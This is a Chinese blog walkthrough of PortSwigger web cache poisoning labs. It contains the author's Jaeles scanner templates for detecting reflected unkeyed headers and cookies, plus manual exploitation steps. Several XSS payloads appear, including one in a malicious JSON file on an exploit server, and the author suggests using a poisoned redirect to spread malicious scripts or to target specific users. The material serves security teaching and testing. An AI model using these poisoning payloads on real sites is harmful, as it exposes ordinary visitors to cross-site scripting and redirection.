<h2 id="3-靶场"><a href="#3-靶场" class="headerlink" title="3. 靶场"></a>3. 靶场</h2><p>靶场练习可以使用James Kettle的工具Param Miner(BurpSuite应用商店可找到)。但是我觉得这个工具比较慢比较耗费电脑资源。所以我自己编写了Jaeles漏洞扫描器的一些简单检测插件，由于对插件逻辑不是太熟悉再加上时间不够，目前只完成快速检测回显，后续会加入投毒比对，然后就可以批量检测，而不需要像Param Miner一个站点一个站点的去看了。</p>
<h3 id="3-1-缓存判断插件"><a href="#3-1-缓存判断插件" class="headerlink" title="3.1 缓存判断插件"></a>3.1 缓存判断插件</h3><p>挖掘一个缓存投毒漏洞的时候，首先要考虑unkeyed的请求是否存在缓存，如果没有缓存就没必要测试缓存问题，判断是否有缓存我们可以通过响应中的特定参数，比如cache-control和expire来判断。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">cacheable</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">cacheable</span></span><br><span class="line">  <span class="attr">risk:</span> <span class="string">info</span></span><br><span class="line"></span><br><span class="line"><span class="attr">params:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">root:</span> <span class="string">&#x27;<span class="template-variable">&#123;&#123;.Raw&#125;&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">      &#123;&#123;.root&#125;&#125;</span></span><br><span class="line"><span class="string"></span>    <span class="attr">headers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">User-Agent:</span> <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55&#x27;</span></span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">        RegexSearch(&quot;resHeaders&quot;, &quot;Cache-Control: max-age=\d*&quot;)</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">        RegexSearch(&quot;resHeaders&quot;, &quot;ETag:&quot;)</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">        RegexSearch(&quot;resHeaders&quot;, &quot;Last-Modified:&quot;)</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line">        <span class="string">RegexSearch(&quot;resHeaders&quot;,</span> <span class="string">&quot;Expires:&quot;</span><span class="string">)</span>  </span><br></pre></td></tr></table></figure>





<h3 id="3-2-Param-Miner的使用"><a href="#3-2-Param-Miner的使用" class="headerlink" title="3.2 Param Miner的使用"></a>3.2 Param Miner的使用</h3><p>直接在BurpSuite的应用商店找到，点击安装即可。</p>
<p> <img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224090312085.png" alt="image-20210224090312085"></p>
<p>github地址：<a href="https://github.com/PortSwigger/param-miner">https://github.com/PortSwigger/param-miner</a></p>
<p>工具的原理是字典结合比对的方式实现的，比如它要测试x-forwarded-for这个参数是否存在投毒。</p>
<p>它会重复发送两种数据包一个是x-forwarded-for: test，一个是x-forwarded-forxxxx: 1111。如果x-forwarded-forxxxx: 1111的结果是test，就说明投毒成功。为了安全性，param miner会在每个请求的url参数HTTP请求里添加随机参数，以避免影响到正常用户。</p>
<p>除了测试缓存投毒以外，param miner很重要的一个功能是猜测参数、额外的HTTP请求头，DOS攻击。猜测参数它内置了一个字典，该字典是爬取的github上的常见参数组成的字典。</p>
<p>如下图是安装好后，鼠标右键出现的一些选项。</p>
<p> <img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224091125193.png" alt="image-20210224091125193"></p>
<p>可以在顶部按钮点击进行配置，当然也可以测试的时候单独配置。配置项里面一般默认配置就可以了，如果其他配置，可以根据需要勾选。一般我们右键直接<code>Guess everything</code>就好了，但是一般这样很慢，所以有时候选择只猜测请求头也是不错的<code>Guess headers</code></p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210224091533071.png" alt="image-20210224091533071"></p>
<h3 id="3-3-X-Forwarded-Host-投毒"><a href="#3-3-X-Forwarded-Host-投毒" class="headerlink" title="3.3 X-Forwarded-Host 投毒"></a>3.3 X-Forwarded-Host 投毒</h3><p>这个漏洞通过对X-Forward-Host投毒，将self xss转化对任意用户的xss攻击。</p>
<p>首先访问<code>PortSwigger</code>的 <code>Lab: Web cache poisoning with an unkeyed header</code>实验，<a href="https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header">实验地址</a></p>
<p>访问后如下所示</p>
<img src="../images/pics/web缓存投毒攻击/image-20210126145541074.png" alt="image-20210126145541074" style="zoom:50%;" />



<h4 id="确认unkeyed"><a href="#确认unkeyed" class="headerlink" title="确认unkeyed"></a>确认unkeyed</h4><p>首先测试一下请求头是否会直接返回到响应中，因为缓存投毒攻击最常见的就是host头的投毒，我编写了一个针对X-Forward-Host回显的jaeles扫描器插件。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># X-Forwarded-Host in Response</span></span><br><span class="line"><span class="attr">id:</span> <span class="string">x-forwarded-host</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">fuzz</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">Reflect</span> <span class="string">for</span> <span class="string">X-Forwarded-Host</span></span><br><span class="line">  <span class="attr">risk:</span> <span class="string">Low</span></span><br><span class="line"></span><br><span class="line"><span class="attr">variables:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">ran:</span> <span class="string">&#x27;RandomString(4)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">payloads:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;xforhosttest<span class="template-variable">&#123;&#123;.ran&#125;&#125;</span>&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;xforhosttest<span class="template-variable">&#123;&#123;.ran&#125;&#125;</span>&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;xforhosttest<span class="template-variable">&#123;&#123;.ran&#125;&#125;</span>&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;xforhosttest<span class="template-variable">&#123;&#123;.ran&#125;&#125;</span>&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;xforhosttest<span class="template-variable">&#123;&#123;.ran&#125;&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">generators:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Header(&quot;&#123;&#123;.payload&#125;&#125;&quot;,</span> <span class="string">&quot;X-Forwarded-Host&quot;</span><span class="string">)</span></span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">        StatusCode() == 200 &amp;&amp; StringSearch(&quot;Response&quot;,&quot;xforhosttest&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>插件说明：</p>
<blockquote>
<ol>
<li><p>生成一个4位的随机数(可要可不要)</p>
</li>
<li><p>添加一个标识: “cookiereflect”。组合成payload: 随机数+标识</p>
</li>
<li><p>5个一样的payload表示重复5次发包</p>
</li>
<li><p>加入到请求头”Header: payload”也就是 “X-Forwarded-Host:xforhosttestxxxx “</p>
</li>
<li><p>如果状态码是200并且响应包找到”xforhosttest”，表示存在该问题</p>
</li>
</ol>
</blockquote>
<p>如果在响应中检测到X-Forwarded-Host的值，说明该值可控。（注意，有时侯需要反复检查，因为不一定会命中缓存）</p>
<p>开启监听后，将主页请求代理到扫描器成功检测出了一个X-Forwarded-Host的回显。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210126150819389.png" alt="image-20210126150819389"></p>
<p>扫描器帮我们发现可疑点后就需要进行手动测试了，将请求放到BurpSuite的Repeater，添加X-Forwarded-Host请求，为了避免影响到其他用户，我们选择别人不会访问的资源，所有构造了一个url: ?test=1 插入X-Forwarded-Host后并没有找到回显。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210126154246309.png" alt="image-20210126154246309"></p>
<p>通过分析，发现是<code>X-Cache: hit</code>的原因，hit表示命中缓存，所有X-Forwarded-Host还是之前缓存的内容。不断重放请求知道test回显出来，回显之后继续重放，直到再次出现<code>X-Cache: hit</code>。表示现在已经命中了新的缓存。<a href="https://blog.csdn.net/jeffasd/article/details/60140438">不同厂商的CDN</a> <img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210126154627672.png" alt="image-20210126154627672"></p>
<h4 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h4><p>确认缓存后，接下来就是确认危害性，由于我们是对一个没有人访问的资源进行投毒，所以不会影响到其他用户，可以构造任意的payload。最常见的当然是XSS。</p>
<p>此处我们构造出XSS Payload <code>&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210126155448168.png" alt="image-20210126155448168"></p>
<p>重放请求直到<code>X-Cache: hit</code>命中新的缓存。</p>
<p>用浏览器请求这个资源发现如图，无法弹出cookie。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210126160158690.png" alt="image-20210126160158690"></p>
<p>对cookie进行分析，发现使用了HttpOnly，无法通过js加载Cookie。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210126160316805.png" alt="image-20210126160316805"></p>
<p>通过对X-Forwarded-Host的投毒，成功将self xss转变成了对任意用户的xss攻击。</p>
<h3 id="3-4-Cookie投毒"><a href="#3-4-Cookie投毒" class="headerlink" title="3.4 Cookie投毒"></a>3.4 Cookie投毒</h3><p>要对cookie进行测试首先得确定是否回显，同样编写了一个针对cook回显的jaeles插件</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">cookie-reflect-body</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">fuzz</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">Cookie</span> <span class="string">reflect</span> <span class="string">in</span> <span class="string">body</span></span><br><span class="line">  <span class="attr">risk:</span> <span class="string">Low</span></span><br><span class="line"></span><br><span class="line"><span class="attr">variables:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">ran:</span> <span class="string">RandomString(4)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">payloads:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;cookiereflect<span class="template-variable">&#123;&#123;.ran&#125;&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">generators:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Cookie(&quot;[[.original]]&#123;&#123;.payload&#125;&#125;&quot;)</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Header(&quot;&#123;&#123;.payload&#125;&#125;&quot;,</span> <span class="string">&quot;Cookie&quot;</span><span class="string">)</span></span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line">        <span class="string">StatusCode()</span> <span class="string">==</span> <span class="number">200</span> <span class="string">&amp;&amp;</span> <span class="string">StringSearch(&quot;Response&quot;,&quot;cookiereflect&quot;)</span></span><br></pre></td></tr></table></figure>

<p>插件说明：</p>
<blockquote>
<ol>
<li><p>生成四位随机数</p>
</li>
<li><p>添加cookiereflect标识</p>
</li>
<li><p>组成payload: 标识+随机字符</p>
</li>
<li><p>请求头添加cookie,这里有两种，”Cookie: payload” ; “Cookie:param=payload”</p>
</li>
<li><p>在响应中搜索标识</p>
</li>
</ol>
</blockquote>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210128152651406.png" alt="image-20210128152651406"></p>
<p>检测到回显（在测试可能需要多次测试以命中缓存）后，接下来就是该参数是否是unkeyed。</p>
<p>注入payload:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.domain)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>重放包，直到<code>X-Cache: hit</code></p>
<p>命中缓存。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210128154155722.png" alt="image-20210128154155722"></p>
<p>任何用户访问主站就会遭受到xss攻击</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210128154012345.png" alt="image-20210128154012345"></p>
<h3 id="3-5-多个请求头的投毒"><a href="#3-5-多个请求头的投毒" class="headerlink" title="3.5 多个请求头的投毒"></a>3.5 多个请求头的投毒</h3><p>后台支持 <code>X-Forwarded-Host</code> and <code>X-Forwarded-Scheme</code> 两个请求头，当 <code>X-Forwarded-Scheme</code> 的值是非https时，服务器会重定向到 https协议的指定URL，该URL的值取决于请求头 <code>X-Forwarded-Host</code> </p>
<p>编写一个插件用来检测此逻辑的插件</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">x-forwarded-scheme-http-host-redirect.yaml</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">fuzz</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">x-forwarded-scheme</span> <span class="string">https</span> <span class="string">host</span> <span class="string">redirect</span></span><br><span class="line">  <span class="attr">risk:</span> <span class="string">Medium</span></span><br><span class="line"></span><br><span class="line"><span class="attr">payloads:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">    http</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">generators:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Header(&quot;&#123;&#123;.payload&#125;&#125;&quot;,</span> <span class="string">&quot;X-Forwarded-Scheme&quot;</span><span class="string">)</span></span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">        StatusCode() == 302</span></span><br><span class="line"><span class="string"></span>  <span class="bullet">-</span> <span class="attr">generators:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Header(&quot;&#123;&#123;.payload&#125;&#125;&quot;,</span> <span class="string">&quot;X-Forwarded-Scheme&quot;</span><span class="string">)</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Header(&quot;shadowtest&quot;,</span> <span class="string">&quot;X-Forwarded-Host&quot;</span><span class="string">)</span></span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line">        <span class="string">StringSearch(&quot;resHeaders&quot;,</span> <span class="string">&quot;shadowtest&quot;</span><span class="string">)</span></span><br></pre></td></tr></table></figure>

<p>插件说明：</p>
<blockquote>
<ol>
<li><p>给http请求头添加一个字段”X-Forwarded-Scheme: http”</p>
</li>
<li><p>如果状态码是302就继续发一个包，添加如下两个请求字段。</p>
<ul>
<li>“X-Forwarded-Scheme: http”；</li>
<li>X-Forwarded-Host: shadowtest”</li>
</ul>
</li>
<li><p>在这个响应头中搜索”shadowtest”, 如果找到表面存在漏洞</p>
</li>
</ol>
</blockquote>
<p>除此之外，我另外再写了一个X-Forwarde-Scheme跳转的检测插件，用来做一个粗略的检查</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">x-forwarded-scheme-302.yaml</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">fuzz</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">X-Forwarded-Scheme</span> <span class="number">302</span> <span class="string">redirect</span></span><br><span class="line">  <span class="attr">risk:</span> <span class="string">Low</span></span><br><span class="line"></span><br><span class="line"><span class="attr">payloads:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">    http</span></span><br><span class="line"><span class="string"></span>  <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line"><span class="string">    https</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">generators:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Header(&quot;&#123;&#123;.payload&#125;&#125;&quot;,</span> <span class="string">&quot;X-Forwarded-Scheme&quot;</span><span class="string">)</span></span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line">        <span class="string">StatusCode()</span> <span class="string">==</span> <span class="number">302</span></span><br></pre></td></tr></table></figure>

<p>插件说明</p>
<blockquote>
<p>给请求头分别添加”X-Forwarded-Scheme: http” 和”X-Forwarded-Scheme: https” 。查看是否有302跳转。</p>
</blockquote>
<p>对靶场地址测试后，插件成功检测到了相关安全问题(同样如果是缓存导致的跳转，要多次测试才能命中缓存)。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210130110131055.png" alt="image-20210130110131055"></p>
<p>接下来就是手工验证了。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210130110228316.png" alt="image-20210130110228316"></p>
<p>如上图，我们设置了一个example.com。重定向了example.com。由于命中缓存后，后续用户都会被重定向到example.com。像这种我们可以怎么样来利用呢？</p>
<blockquote>
<ol>
<li>如果是一个访问量极大的站，我们可以用来进行ddos攻击</li>
<li>我们可以把地址设置成恶意服务器来引入恶意脚本</li>
<li>用来做seo优化 </li>
</ol>
</blockquote>
<h3 id="3-6-猜测请求头投毒"><a href="#3-6-猜测请求头投毒" class="headerlink" title="3.6 猜测请求头投毒"></a>3.6 猜测请求头投毒</h3><p>本实验unkey存在于请求头的X-Host参数，而这这个参数并不存在于HTTP协议，所以我们需要猜测。根据<a href="https://github.com/PortSwigger/param-miner">param Miner</a>的字典进行简化，编写了如下的测试脚步来进行Header的枚举，进行粗略检测。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">simple-guess-headers</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">fuzz</span></span><br><span class="line"><span class="attr">level:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">simple</span> <span class="string">Guess</span> <span class="string">headers</span> </span><br><span class="line">  <span class="attr">risk:</span> <span class="string">Low</span></span><br><span class="line"></span><br><span class="line"><span class="attr">variables:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">ran:</span> <span class="string">RandomString(4)</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">head:</span> <span class="string">|</span></span><br><span class="line"><span class="string">      accept</span></span><br><span class="line"><span class="string">      accept-charset</span></span><br><span class="line"><span class="string">      accept-encoding</span></span><br><span class="line"><span class="string">      accept-language</span></span><br><span class="line"><span class="string">      x-host</span></span><br><span class="line"><span class="string">      x-forward-for</span></span><br><span class="line"><span class="string">      x-forwarded-host</span></span><br><span class="line"><span class="string">      x-forwarded-scheme</span></span><br><span class="line"><span class="string">      authorization</span></span><br><span class="line"><span class="string">      cache-control</span></span><br><span class="line"><span class="string">      connection</span></span><br><span class="line"><span class="string">      content-location</span></span><br><span class="line"><span class="string">      content-type</span></span><br><span class="line"><span class="string">      cookie</span></span><br><span class="line"><span class="string">      expires</span></span><br><span class="line"><span class="string">      forwarded</span></span><br><span class="line"><span class="string">      from</span></span><br><span class="line"><span class="string">      proxy-authenticate</span></span><br><span class="line"><span class="string">      proxy-authorization</span></span><br><span class="line"><span class="string">      server</span></span><br><span class="line"><span class="string">      set-cookie</span></span><br><span class="line"><span class="string">      user-agent</span></span><br><span class="line"><span class="string">      x-forwarded-protocol</span></span><br><span class="line"><span class="string">      x-original-url</span></span><br><span class="line"><span class="string">      x-rewrite-url</span></span><br><span class="line"><span class="string">      client-ip</span></span><br><span class="line"><span class="string">      x-real-ip</span></span><br><span class="line"><span class="string">      x-originating-ip</span></span><br><span class="line"><span class="string">      uri</span></span><br><span class="line"><span class="string">      x-authentication</span></span><br><span class="line"><span class="string">      x-authentication-key</span></span><br><span class="line"><span class="string">      x-authorization</span></span><br><span class="line"><span class="string">      x-auth-token</span></span><br><span class="line"><span class="string">      proxy-http</span></span><br><span class="line"><span class="string">      proxy-socks4</span></span><br><span class="line"><span class="string">      proxy-socks5</span></span><br><span class="line"><span class="string">      redirect</span></span><br><span class="line"><span class="string">      method</span></span><br><span class="line"><span class="string">      x-forwarded-server</span></span><br><span class="line"><span class="string">      Origin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="attr">payloads:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;<span class="template-variable">&#123;&#123;.head&#125;&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">generators:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">Header(&quot;headereflect&#123;&#123;.ran&#125;&#125;&quot;,</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;.payload&#125;&#125;</span>&quot;</span><span class="string">)</span></span><br><span class="line">    <span class="attr">detections:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&gt;-</span></span><br><span class="line">        <span class="string">StringSearch(&quot;response&quot;,</span> <span class="string">&quot;headereflect&quot;</span><span class="string">)</span></span><br></pre></td></tr></table></figure>

<p>检测到x-host参数后当然可以直接投毒，但是这里这个案例可以通过User-Agent实现定向投毒的，在返回包</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210130170904429.png" alt="image-20210130170904429"></p>
<p>我们可以看到一个字段 “Vary: User-Agent”。Vary就是用来表明额外将谁加入cache key的。这里的意思是User-Agent也会加入到cache key 中，如果我们指定一个比较通用的User-Agent就会给很多用户投毒，如果指定某个特定用户的User-Agent我们就可以针对性的投毒。</p>
<p>本题中，我们可以在留言处插入一段如下脚步，让别人访问自己的网站，从而拿到他人的User-Agent，从而实现定向攻击。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210201090054053.png" alt="image-20210201090054053"></p>
<h3 id="3-7-DOM投毒"><a href="#3-7-DOM投毒" class="headerlink" title="3.7 DOM投毒"></a>3.7 DOM投毒</h3><p>用前面编写的插件直接对靶机发起漏洞探测。很块就发现了一个X-Forwarded-Host回显的问题。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210202151540464.png" alt="image-20210202151540464"></p>
<p>之前写的两个插件都检测到了，guess-headers是爆破header字段的，里面也有X-Forwarded-Host，当然也能检测到。我们看一下数据包，明显有X-Forwarded-Host回显问题。但这只是个潜在问题，并不能说明有安全问题。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210202151922285.png" alt="image-20210202151922285"></p>
<p>放入BurpSuite 进行手工测试。为了不影响其他用户，设置一个不存在的资源(<code>/?test=1</code>)进行投毒。重复发包，直到<code>X-Cache: hit</code>命中缓存。（如果响应包有Set-Cookie不能真的存入缓存中，找一个有cookie的请求来测试）</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210202153512601.png" alt="image-20210202153512601"></p>
<p>复制url地址，在浏览器中访问，投毒成功。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210202163616096.png" alt="image-20210202163616096"></p>
<p>这次靶场与前面不同的是可控值存入到了json中。没办法直接插入xss paylod。我们需要找到其他利用点。</p>
<p>目前我们已知一个可控点，下一步，我们看一下此可控点是否被引用。</p>
<p>在返回包里搜索data，可以发现<code>initGeoLocate()</code>是有引用的，这也许就是突破点。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210201141404173.png" alt="image-20210201141404173"></p>
<p>我们不妨把完整的url给它拼接出来<a href="https://ac711f051e66707780530770007a000c.web-security-academy.net/resources/json/geolocate.json%EF%BC%8C%E8%AE%BF%E9%97%AE%E5%90%8E%E5%8F%91%E7%8E%B0%E5%A6%82%E4%B8%8Bjson%E6%95%B0%E6%8D%AE%E3%80%82">https://ac711f051e66707780530770007a000c.web-security-academy.net/resources/json/geolocate.json，访问后发现如下json数据。</a></p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210201141629661.png" alt="image-20210201141629661"></p>
<p>我们回到浏览器研究一下这个函数<code>initGeoLocate()</code>函数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initGeoLocate</span>(<span class="params">jsonUrl</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fetch(jsonUrl)</span><br><span class="line">        .then(<span class="function"><span class="params">r</span> =&gt;</span> r.json())</span><br><span class="line">        .then(<span class="function"><span class="params">j</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> geoLocateContent = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;shipping-info&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> img = <span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">            img.setAttribute(<span class="string">&quot;src&quot;</span>, <span class="string">&quot;/resources/images/localShipping.svg&quot;</span>);</span><br><span class="line">            geoLocateContent.appendChild(img)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> div = <span class="built_in">document</span>.createElement(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">            div.innerHTML = <span class="string">&#x27;Free shipping to &#x27;</span> + j.country;</span><br><span class="line">            geoLocateContent.appendChild(div)</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数拿到上图所示json数据。然后<code>div.innerHTML = &#39;Free shipping to &#39; + j.country;</code>中将country的值输出到DOM节点<code>shipping-info</code>中。</p>
<p>从如上分析，我们可控的<code>X-Forwarded-Host</code>的值被传递到data中，然后又被作为参数传递到<code>initGeoLocate()</code>中。并且<code>initGeoLocate()</code>从我们可控的url中取出参数输出到DOM节点中。</p>
<p>由此，我们可以构造恶意的json数据，并且将恶意数据的url存到缓存中，这样，只有有人访问该页面，就会加载恶意的json数据并且执行</p>
<p><strong>攻击步骤：</strong></p>
<ol>
<li><p>在可控的服务器上构造一个xss payload。下图是靶场提供的利用服务器。注意使用<code>Access-Control-Allow-Origin: *</code>来避免跨域问题。</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">/resources/<span class="type">json</span>/geolocate.json</span><br><span class="line"><span class="keyword">Access</span>-Control-Allow-Origin: *</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;country&quot;: &quot;&lt;img src=1 onerror=alert(document.cookie) /&gt;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210202164838827.png" alt="image-20210202164838827"></p>
<p>只要访问该资源就被攻击。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210202165248679.png" alt="image-20210202165248679"></p>
<p>在自己的vps上也写了一个exp。但是可能是实验环境的限制，没有加载成功。</p>
